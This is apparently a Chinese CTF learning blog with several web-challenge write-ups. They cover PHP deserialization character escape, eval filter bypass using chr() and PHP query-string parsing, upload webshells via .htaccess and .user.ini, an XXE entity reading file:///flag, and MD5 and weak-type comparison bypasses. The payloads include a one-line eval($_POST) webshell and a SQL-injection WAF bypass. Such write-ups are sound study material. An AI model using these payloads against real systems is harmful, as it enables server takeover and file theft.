<p>flag{6b671cf1-9558-47f6-9cd2-46ff8e32a3e9}</p>
<h2 id="安恒的-Ezunserialize"><a href="#安恒的-Ezunserialize" class="headerlink" title="安恒的 Ezunserialize"></a>安恒的 Ezunserialize</h2><p>一进去，直接源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//show_source(&quot;test.php&quot;);</span></span><br><span class="line"><span class="comment">//写函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"><span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//chr(0)==NULL</span></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="title function_ invoke__">chr</span>(<span class="number">0</span>) . <span class="string">&#x27;*&#x27;</span> . <span class="title function_ invoke__">chr</span>(<span class="number">0</span>), <span class="string">&#x27;\0\0\0&#x27;</span>, <span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//读函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"><span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;\0\0\0&#x27;</span>, <span class="title function_ invoke__">chr</span>(<span class="number">0</span>) . <span class="string">&#x27;*&#x27;</span> . <span class="title function_ invoke__">chr</span>(<span class="number">0</span>), <span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="comment">//构造函数确定</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$a</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$b</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="comment">//析构函数输出</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>=<span class="string">&#x27;gay&#x27;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b = <span class="variable">$a</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$c</span> = <span class="string">&#x27;a&#x27;</span>.<span class="variable language_">$this</span>-&gt;b;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;</span><br><span class="line">    <span class="comment">//这里利用字符串输出文件  需要一个echo调用——toString</span></span><br><span class="line">    <span class="comment">// B类析构函数可以这样  也就是说 B类中的是</span></span><br><span class="line">    <span class="comment">//从A类进去</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="comment">//flag.php</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;c);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;nice&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>],<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>]);</span><br><span class="line"><span class="comment">//省略了存储序列化数据的过程,下面是取出来并反序列化的操作</span></span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">read</span>(<span class="title function_ invoke__">write</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>))));</span><br></pre></td></tr></table></figure>

<p>那么思路挺清楚的。A类一开始赋值。之后序列化A类，再反序列化A类。</p>
<p>那么就应该是 在赋值A类的时候，是字符串。在反序列化的时候，把字符串返回来的时候也要把B类给反序列化出来。</p>
<p>可是序列化A类之后的字符串是：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">string(116) &quot;O:1:&quot;A&quot;:2:&#123;s:8:&quot;username&quot;;s:2:&quot;li&quot;;s:8:&quot;password&quot;;s:57:&quot;;&#125;O:1:&quot;B&quot;:1:&#123;s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:&#123;s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;&#125;&#125;       &quot;%00;&#125;&quot;</span><br><span class="line">也就是</span><br><span class="line">O:1:&quot;A&quot;:2&#123;</span><br><span class="line">s:8:&quot;username&quot;;</span><br><span class="line">s:2:&quot;li&quot;;</span><br><span class="line">s:8:&quot;password&quot;;</span><br><span class="line">s:57:&quot;;&#125;   //这里字符数限制了反序列化解析的时候字符控制，</span><br><span class="line">O:1:&quot;B&quot;:1:&#123;</span><br><span class="line">s:1:&quot;b&quot;;</span><br><span class="line">O:1:&quot;C&quot;:1:&#123;s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br><span class="line">&#125;</span><br><span class="line">%00&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>他这里 我们在GET参数进去的时候就已经确定了自己是字符串。</p>
<p>那么在序列化的时候，也确实两者是字符串。</p>
<p>所以我们的目的是改变他认为这个是字符串！！</p>
<hr>
<p>按照颖奇师傅的wp</p>
<p>我们要这么构造pop链</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title function_ invoke__">B</span>();</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title function_ invoke__">C</span>();</span><br><span class="line"><span class="variable">$c</span>-&gt;c=<span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="variable">$b</span>-&gt;b=<span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;username=<span class="string">&quot;1&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;password=<span class="variable">$b</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>

<p>这样之后就可以得到序列化后的字符串</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://img-blog.csdnimg.cn/20200426123804451.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0RVT2FuMDIxNg==,size_16,color_FFFFFF,t_70"
                      alt="在这里插入图片描述"
                ></p>
<p>即是：<code>O:1:&quot;A&quot;:2:&#123;s:8:&quot;username&quot;;s:1:&quot;1&quot;;s:8:&quot;password&quot;;O:1:&quot;B&quot;:1:&#123;s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:&#123;s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;&#125;&#125;&#125;</code></p>
<p>分解一下看一下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">1</span>:<span class="string">&quot;A&quot;</span>:<span class="number">2</span>:&#123;                   头类</span><br><span class="line">s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;				属性</span><br><span class="line">s:<span class="number">1</span>:<span class="string">&quot;1&quot;</span>;					字符串值</span><br><span class="line">s:<span class="number">8</span>:<span class="string">&quot;password&quot;</span>;				属性</span><br><span class="line">O:<span class="number">1</span>:<span class="string">&quot;B&quot;</span>:<span class="number">1</span>:&#123;					类</span><br><span class="line">	s:<span class="number">1</span>:<span class="string">&quot;b&quot;</span>;				</span><br><span class="line">	O:<span class="number">1</span>:<span class="string">&quot;C&quot;</span>:<span class="number">1</span>:&#123;				</span><br><span class="line">		s:<span class="number">1</span>:<span class="string">&quot;c&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但是我们输入的时候会被默认字符串 也就是说 不能被解析为类！ 这咋办呢？</p>
<h3 id="字符逃逸d"><a href="#字符逃逸d" class="headerlink" title="字符逃逸d"></a>字符逃逸d</h3><p>这里的字符逃逸是怎么回事呢？</p>
<p>看看write和read的代码先:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//写函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"><span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line">    <span class="comment">//chr(0)==NULL</span></span><br><span class="line">    <span class="comment">//如果有*的话 就改成 \0\0\0  </span></span><br><span class="line">    <span class="comment">//也就是说 三个字符变成 6个字符 拉长了</span></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="title function_ invoke__">chr</span>(<span class="number">0</span>) . <span class="string">&#x27;*&#x27;</span> . <span class="title function_ invoke__">chr</span>(<span class="number">0</span>), <span class="string">&#x27;\0\0\0&#x27;</span>, <span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//读函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"><span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line">	<span class="comment">// //入宫有\0\0\0 那么我们就替换成 .*.这样的形式  </span></span><br><span class="line">	<span class="comment">//这个可以让我们把6个字符变成3个字符</span></span><br><span class="line">    <span class="comment">//牛逼</span></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;\0\0\0&#x27;</span>, <span class="title function_ invoke__">chr</span>(<span class="number">0</span>) . <span class="string">&#x27;*&#x27;</span> . <span class="title function_ invoke__">chr</span>(<span class="number">0</span>), <span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里我们看看<code>\0\0\0</code>和另外一个的字符长度！</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">string</span>(<span class="number">6</span>) <span class="string">&quot;\0\0\0&quot;</span></span><br><span class="line"><span class="keyword">string</span>(<span class="number">3</span>) <span class="string">&quot;*&quot;</span></span><br></pre></td></tr></table></figure>

<p>这里说 前者占6个字符的位置，后者占3个字符的位置。</p>
<p>那么这就是字符逃逸了呀！</p>
<p>借用颖奇师傅的wp用一下</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://img-blog.csdnimg.cn/20200426131435346.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0RVT2FuMDIxNg==,size_16,color_FFFFFF,t_70"
                      alt="在这里插入图片描述"
                ></p>
<p>那么我们的大致思路就有了。利用read函数把6个字符减半的特点。</p>
<p>我们可以实现反序列化字符逃逸。</p>
<p>真的牛逼。服气了，我当时根本没有理会那两个函数。。</p>
]]></content>
      <categories>
        <category>刷题</category>
      </categories>
  </entry>
  <entry>
    <title>四月份安全-2</title>
    <url>/2020/04/08/%E5%9B%9B%E6%9C%88/%E5%9B%9B%E6%9C%88%E4%BB%BD%E5%AE%89%E5%85%A8-2/</url>
    <content><![CDATA[<h2 id="2020-04-07"><a href="#2020-04-07" class="headerlink" title="2020.04.07"></a>2020.04.07</h2><p>今天是因为身体不行了，然后有学了两个小时的php开发。</p>
<p>所以没多少时间写了。。</p>
<p>明天补上！</p>
<h2 id="2020-04-08"><a href="#2020-04-08" class="headerlink" title="2020.04.08"></a>2020.04.08</h2><h2 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" title="[HCTF 2018]admin"></a>[HCTF 2018]admin</h2><p>首先直接进去后。</p>
<p>查看源码：有注释你不是admin用户</p>
<p>说明如果是admin用户就可以得到flag了</p>
<p>然后注册登陆。可以看到有一个注释，是源码的地址。</p>
<p>然后我就不会了</p>
<p>他是python的flask的漏洞和源码审计。。</p>
<p>还有seeesion的问题。是个可以被解密的签证。</p>
<p>我傻了。留着吧。 </p>
<p>主要参考：</p>
<p><a class="link"   href="https://www.cnblogs.com/chrysanthemum/p/11722351.html" >https://www.cnblogs.com/chrysanthemum/p/11722351.html<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://xz.aliyun.com/t/3569#toc-0" >https://xz.aliyun.com/t/3569#toc-0<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://www.leavesongs.com/PENETRATION/client-session-security.html" >https://www.leavesongs.com/PENETRATION/client-session-security.html<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://cizixs.com/2017/03/08/flask-insight-session/" >https://cizixs.com/2017/03/08/flask-insight-session/<i class="fas fa-external-link-alt"></i></a></p>
<span id="more"></span>

<h2 id="2020-04-09"><a href="#2020-04-09" class="headerlink" title="2020.04.09"></a>2020.04.09</h2><h2 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h2><p>这道题目有趣多了</p>
<p>学到的知识点</p>
<p>1、如果我们的单引号和双引号被过滤了</p>
<p>我们怎么输入字符串？</p>
<p>​	1）、<code>chr()</code></p>
<p>​			<code>chr ( int $ascii) : string</code>:返回指定的字符</p>
<p>​	2）、<code>hex2bin ( string $data ) : string</code></p>
<p>​			：把十六进制字符串转化为二进制字符串</p>
<p>​			<code>dechex ( int $number) : string</code>	</p>
<p>​			：十进制数字转化为十六进制字符串</p>
<p>2、如何查看当前目录下有什么。除了直接使用<code>system()</code></p>
<p>​		<code>scandir ( string $directory [, int $sorting_order [, resource $context ]] ) : array</code></p>
<p>​		返回一个数组。数组里包含<code>directory</code>中的文件和目录</p>
<p>3、PHP字符串解析</p>
<p>​		</p>
<p><strong>字符串解析</strong></p>
<p>PHP查询字符串（在URL或正文中）转化为内部<code>$_GET</code>或<code>$_POST</code>数组时，例如：&#x2F;?foo&#x3D;bar变成Array([foo] &#x3D;&gt; “bar”)。值得注意的是，查询字符串在解析的过程中会将某些字符删除或用下划线代替。例如，&#x2F;?%20news[id%00&#x3D;42会转换为Array([news_id] &#x3D;&gt; 42)。如果一个IDS&#x2F;IPS或WAF中有一条规则是当news_id参数的值是一个非数字的值则拦截，那么我们就可以用以下语句绕过：</p>
<p><code>/news.php?%20news[id%00=42&quot;+AND+1=0--</code></p>
<p>PHP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：</p>
<p>1.删除空白符</p>
<p>2.将某些字符转换为下划线（包括空格）</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://img-blog.csdnimg.cn/20200408085244645.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0RVT2FuMDIxNg==,size_16,color_FFFFFF,t_70"
                     
                ></p>
<p>这也是为什么上一篇有一道题目</p>
<p>他过滤了下划线，而变量名字为<code>b_u_r_p</code></p>
<p>我们可以利用 <code>b%20u%20r%20p</code>来成功输入变量</p>
<p>好了基本知识点都知道了</p>
<p>我们来解解题目</p>
<p>测试发现，输入只能是数字和特殊字符，不允许使用字母</p>
<p>这里就是利用PHP字符串解析了。</p>
<p>假如waf不允许num变量传递字母：</p>
<p><code>http://www.xxx.com/index.php?num = aaaa   //显示非法输入的话</code><br>那么我们可以在num前加个空格：</p>
<p><code>http://www.xxx.com/index.php? num = aaaa</code><br>这样waf就找不到num这个变量了，因为现在的变量叫“ num”，而不是“num”。</p>
<p>但php在解析的时候，会先把空格给去掉，这样我们的代码还能正常运行，还上传了非法字符。</p>
<p>至于是怎么发现是这个的。。。我哪知道啊。</p>
<p>之后 我们审查一下calc.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">        <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>,<span class="string">&#x27;\$&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;\^&#x27;</span>];</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$str</span>)) &#123;</span><br><span class="line">                        <span class="keyword">die</span>(<span class="string">&quot;what are you want to do?&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$str</span>.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>看的出来，它过滤了<code> 空格   单引号   双引号  换行  [   ]   $  \  ^</code></p>
<p>还好没有过滤<code> (   )</code>。那么我们可以利用很多了</p>
<p>ascii码表查找：<a class="link"   href="http://ascii.911cha.com/" >http://ascii.911cha.com/<i class="fas fa-external-link-alt"></i></a></p>
<p>不就是不给直接输入字符串嘛！</p>
<p>然后我尝试payload<code>?%20num=2;system(chr(108).chr(115))</code></p>
<p>结果不能出来目录。还记得上次无参RCE使用的scandir()函数</p>
<p>然后使用<code>?%20num=2;var_dump(scandir(chr(47)))</code>直接扫根目录</p>
<p>一般flag都在根目录里面</p>
<p>那么后面的操作就容易了</p>
<p><code>?%20num=2;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</code> </p>
<p>不说了，另外一种http走私不会。。就这样，等刷完BUU我再刷第二遍的时候</p>
<p>就精细一点。！</p>
<p>参考：<a class="link"   href="https://www.cnblogs.com/chrysanthemum/p/11757363.html" >https://www.cnblogs.com/chrysanthemum/p/11757363.html<i class="fas fa-external-link-alt"></i></a></p>
<p>参考里有很多的参考【？？套娃【笑   </p>
<h3 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h3><p>文件上传题目</p>
<p>新的利用点 ——**.user.ini**</p>
<p>整理下文件上传题的步骤：</p>
<p>随意上传php</p>
<p>fuzz后缀测试【可后面再做</p>
<p>改未知扩展名如.aaa来判断是黑名单还是白名单</p>
<p>之后再判断<code>&lt;?</code>问题</p>
<p>再判断MIME问题</p>
<p>文件头问题</p>
<p>有一个经常可以通过的<code>&lt;script language=&#39;php&#39;&gt; @eval($_POST[&#39;aaa&#39;]);&lt;scirpt&gt;</code></p>
<p>黑名单过滤而且可以上传图片马，那我们首先想到的肯定是传一个.htaccess上去来将图片马解析为php</p>
<p>这个方法是.htaccess文件内容为</p>
<figure class="highlight haskell"><table><tr><td class="code"><pre><span class="line">&lt;<span class="type">FilesMatch</span> <span class="string">&quot;jpg&quot;</span>&gt; </span><br><span class="line">    <span class="type">SetHandler</span> application/x-httpd-php</span><br><span class="line">&lt;/<span class="type">FilesMatch</span>&gt;</span><br></pre></td></tr></table></figure>

<p>除此之外还有一个<code>.user.ini</code>的方法</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://xzfile.aliyuncs.com/media/upload/picture/20190824211552-4c92f9fe-c671-1.png"
                     
                ></p>
<p>也就是说我们可以在<code>.user.ini</code>中设置<code>php.ini</code>中<strong>PHP_INI_PERDIR</strong> 和 <strong>PHP_INI_USER</strong> 模式的 INI 设置，而且只要是在使用 <strong>CGI／FastCGI</strong> 模式的服务器上都可以使用<code>.user.ini</code></p>
<p>在p牛的文章中提到了两个有趣的设置：<strong>auto_prepend_file</strong>和<strong>auto_append_file</strong></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://xzfile.aliyuncs.com/media/upload/picture/20190824211604-538774ce-c671-1.png"
                     
                ></p>
<p>大致意思就是：我们指定一个文件（如liduoan.jpg），那么该文件就会被包含在要执行的php文件中（如index.php），类似于在index.php中插入一句：<code>require(./liduoan.jpg);</code></p>
<p>这两个设置的区别只是在于<strong>auto_prepend_file</strong>是在文件前插入；<strong>auto_append_file</strong>在文件最后插入（当文件调用的有<code>exit()</code>时该设置无效）</p>
<p>那么我们在.user.ini文件中写入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">auto_preprnd_file=liduoan.jpg</span><br></pre></td></tr></table></figure>

<p>这样，在我们访问某个php文件的时候，liduoan.jpg就会被插入在这个php文件前面。那么liduoan.jpg的php代码不就可以执行了？！</p>
<p>好了，讲讲**.user.ini**的利用条件</p>
<ul>
<li>服务器脚本为PHP</li>
<li>服务器使用CGI&#x2F;FastCGI模式</li>
<li>上传目录下要有可执行的php文件</li>
</ul>
<p>优势： 和**.htaccess**后门比，范围更加广，nginx&#x2F;apache&#x2F;IIS都有效。而.htaccess只对apache有效</p>
<p>注意和利用.htaccess的差别，在解题中最重要的是上传目录文件夹下有可执行的脚本。</p>
<p><strong>具体解题步骤</strong></p>
<p>上传.user.ini  liduoan.jpg文件</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://img-blog.csdnimg.cn/20200408143113205.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0RVT2FuMDIxNg==,size_16,color_FFFFFF,t_70"
                     
                ></p>
<p>之后蚁剑连接<code>/uploads/76d9f00467e5ee6abc3ca60892ef304e/index.php</code></p>
<p>根目录查看flag 【全都是在根目录。。。</p>
<p>参考：<a class="link"   href="https://xz.aliyun.com/t/6091#toc-1" >https://xz.aliyun.com/t/6091#toc-1<i class="fas fa-external-link-alt"></i></a></p>
<h2 id="2020-04-16"><a href="#2020-04-16" class="headerlink" title="2020.04.16"></a>2020.04.16</h2><h3 id="极客大挑战-2019-RCE-ME"><a href="#极客大挑战-2019-RCE-ME" class="headerlink" title="[极客大挑战 2019]RCE ME"></a>[极客大挑战 2019]RCE ME</h3>]]></content>
      <categories>
        <category>刷题</category>
      </categories>
  </entry>
  <entry>
    <title>四月份web-1.0</title>
    <url>/2020/04/01/%E5%9B%9B%E6%9C%88/%E5%9B%9B%E6%9C%88%E4%BB%BD%E5%AE%89%E5%85%A8/</url>
    <content><![CDATA[<h2 id="2020-04-01"><a href="#2020-04-01" class="headerlink" title="2020.04.01"></a>2020.04.01</h2><h2 id="NCTF-Fake-XML-cookbook"><a href="#NCTF-Fake-XML-cookbook" class="headerlink" title="NCTF-Fake XML cookbook"></a>NCTF-Fake XML cookbook</h2><p>这道题目是校赛题目，有一说一，我当时没写出来。郁闷。</p>
<p>整理知识点就是XXE 读取文件</p>
<p>payload为：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">ANY</span>[</span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ENTITY <span class="keyword">test</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;test;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">password</span>&gt;</span>123<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>xxe-lib的原题 基础XXE吧。</p>
<p>具体知识点看合天培训 ，那里很清楚。 主要就是读取文件赋值返回。</p>
<h3 id="ez-bypass"><a href="#ez-bypass" class="headerlink" title="ez_bypass"></a>ez_bypass</h3><p>考点：MD5  弱类型比较</p>
<p>这题目就很容易了</p>
<span id="more"></span>

<p>直接看源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">I put something in F12 <span class="keyword">for</span> you</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="variable">$flag</span>=<span class="string">&#x27;MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;gg&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">    <span class="variable">$gg</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;gg&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="variable">$id</span>) === <span class="title function_ invoke__">md5</span>(<span class="variable">$gg</span>) &amp;&amp; <span class="variable">$id</span> !== <span class="variable">$gg</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;You got the first step&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>])) &#123;</span><br><span class="line">            <span class="variable">$passwd</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>];</span><br><span class="line">            <span class="keyword">if</span> (!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$passwd</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                 <span class="keyword">if</span>(<span class="variable">$passwd</span>==<span class="number">1234567</span>)</span><br><span class="line">                 &#123;</span><br><span class="line">                     <span class="keyword">echo</span> <span class="string">&#x27;Good Job!&#x27;</span>;</span><br><span class="line">                     <span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">                     <span class="keyword">die</span>(<span class="string">&#x27;By Retr_0&#x27;</span>);</span><br><span class="line">                 &#125;</span><br><span class="line">                 <span class="keyword">else</span></span><br><span class="line">                 &#123;</span><br><span class="line">                     <span class="keyword">echo</span> <span class="string">&quot;can you think twice??&quot;</span>;</span><br><span class="line">                 &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;You can not get it !&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;only one way to get the flag&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;You are not a real hacker!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Please input first&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>需要绕过MD5  和  数字比较</p>
<p>MD5 如果是<code>==</code>可以使用md5处理后都为0e的样子</p>
<p>但是如果是<code>===</code>就只能利用数组  MD5数组返回NULL  两个NULL相等</p>
<p><code>is_numeric($passwd)</code></p>
<p>这个直接使用弱类型比较  <code>passwd=1234567a</code></p>
